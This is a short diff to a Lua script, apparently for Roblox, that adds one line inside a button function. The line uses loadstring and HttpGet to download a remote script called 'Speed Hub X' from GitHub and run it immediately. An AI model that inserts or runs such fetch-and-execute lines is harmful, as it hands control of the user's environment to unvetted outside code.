@@ -138,7 +138,7 @@ local function createButton()
         if visible then
             update()
         end
-       
+       loadstring(game:HttpGet("https://raw.githubusercontent.com/AmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua"))()
         -- Countdown coroutine
         coroutine.wrap(function()
             for i = 29, 1, -1 do
@@ -163,4 +163,5 @@ while true do
         clearAll()
     end
 end
+
 
